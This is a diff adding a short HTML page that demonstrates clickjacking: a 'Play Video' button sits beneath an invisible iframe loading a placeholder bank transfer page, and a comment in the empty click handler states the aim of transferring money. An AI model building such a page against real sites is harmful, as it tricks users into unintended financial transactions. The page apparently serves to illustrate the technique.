@@ -1,0 +1,25 @@
+<!DOCTYPE html> 
+<html lang="en"> 
+<head> 
+<meta charset="UTF-8">
+<title>Play Video</title> 
+<style> 
+#bankingIframe 
+{ opacity: 0; /* Makes the iframe invisible */ position: absolute; 
+top: 50px;
+left: 50px; 
+width: 200px; 
+height: 50px; 
+z-index: 9999; }
+</style>
+</head> 
+<body> 
+<button id="playButton" style="width: 200px; height: 50px;">Play Video</button> 
+<iframe id="bankingIframe" src="https://banking-website.com/transfer"></iframe>
+<script> document.getElementById('playButton').addEventListener('click', function() { 
+// Code to transfer money, clicking the hidden iframe button 
+}); 
+</script> 
+</body> 
+</html>
+
